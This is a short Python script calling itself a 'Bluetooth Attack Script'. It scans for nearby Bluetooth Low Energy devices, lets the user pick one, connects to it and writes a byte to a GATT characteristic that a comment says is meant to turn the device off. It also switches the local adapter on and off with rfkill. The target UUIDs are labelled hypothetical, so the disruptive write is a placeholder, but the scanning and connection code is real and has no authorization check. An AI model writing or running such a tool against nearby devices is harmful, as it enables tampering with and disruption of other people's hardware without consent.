#!/usr/bin/env python3

import asyncio
import subprocess
from bleak import BleakScanner, BleakClient
import os
import sys

# Hypothetical UUIDs for demonstration
SERVICE_UUID = "0000180f-0000-1000-8000-00805f9b34fb"
CHARACTERISTIC_UUID = "00002a19-0000-1000-8000-00805f9b34fb"

async def scan_devices(duration):
    """Scan for nearby Bluetooth devices."""
    print(f"Scanning for BLE devices for {duration} seconds...")
    scanner = BleakScanner()
    devices = await scanner.discover(timeout=duration)
    if not devices:
        print("No devices found.")
    return devices

def display_devices(devices):
    """Display the list of discovered Bluetooth devices."""
    print("Discovered devices:")
    for idx, device in enumerate(devices, start=1):
        print(f"{idx}. Address: {device.address}, Name: {device.name}")
    return devices

def check_bluetooth_status():
    """Check if Bluetooth is enabled and return the status."""
    try:
        result = subprocess.run(['rfkill', 'list', 'bluetooth'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Soft blocked: yes" in result.stdout or "Hard blocked: yes" in result.stdout:
            return False
        return True
    except Exception as e:
        print(f"Error checking Bluetooth status: {e}")
        return False

def enable_bluetooth():
    """Enable Bluetooth."""
    try:
        subprocess.run(['sudo', 'rfkill', 'unblock', 'bluetooth'], check=True)
        print("Bluetooth enabled successfully.")
    except Exception as e:
        print(f"Failed to enable Bluetooth: {e}")

def turn_off_bluetooth():
    """Turn off Bluetooth."""
    try:
        # Block the Bluetooth device
        subprocess.run(['sudo', 'rfkill', 'block', 'bluetooth'], check=True)
        print("Bluetooth turned off successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to turn off Bluetooth: {e}")

async def perform_action(address):
    """Connect to the device and perform an action."""
    print(f"Connecting to device at {address}...")
    try:
        async with BleakClient(address) as client:
            if client.is_connected:
                print(f"Connected to {address}")
                try:
                    # Hypothetical write to turn off the device
                    await client.write_gatt_char(CHARACTERISTIC_UUID, bytearray([0x00]))
                    print(f"Action performed on {address}")
                except Exception as e:
                    print(f"Failed to perform action on {address}: {e}")
            else:
                print(f"Failed to connect to {address}")
    except Exception as e:
        print(f"An unexpected error occurred during connection: {e}")

def menu():
    """Display the main menu and handle user input."""
    devices = []
    while True:
        print("\nBluetooth Attack Script")
        print("1. Scan for BLE devices")
        print("2. Connect and perform action on a device")
        print("3. Turn off Bluetooth")
        print("4. Exit")

        choice = input("Enter your choice: ")

        if choice == '1':
            try:
                if not check_bluetooth_status():
                    enable = input("Bluetooth is disabled. Would you like to enable it? (y/n): ")
                    if enable.lower() == 'y':
                        enable_bluetooth()
                    else:
                        print("Cannot proceed without enabling Bluetooth.")
                        continue

                duration = int(input("Enter scan duration in seconds: "))
                if duration <= 0:
                    raise ValueError("Duration must be positive.")
                devices = asyncio.run(scan_devices(duration))
                devices = display_devices(devices)
            except ValueError as e:
                print(f"Error: {e}")
            except Exception as e:
                print(f"An unexpected error occurred during scanning: {e}")
        elif choice == '2':
            if not devices:
                print("No devices to connect to. Please scan for devices first.")
                continue

            address = input("Enter the address of the device to connect: ")
            if any(device.address == address for device in devices):
                try:
                    asyncio.run(perform_action(address))
                except Exception as e:
                    print(f"An unexpected error occurred during connection: {e}")
            else:
                print("Invalid address. Please enter a valid device address from the scanned list.")
        elif choice == '3':
            turn_off_bluetooth()
        elif choice == '4':
            print("Exiting...")
            sys.exit(0)
        else:
            print("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    try:
        # Check if the script is run with sudo
        if os.geteuid() == 0:
            print("Do not run this script as root (sudo). Exiting.")
            sys.exit(1)
        
        menu()
    except KeyboardInterrupt:
        print("\nScript interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

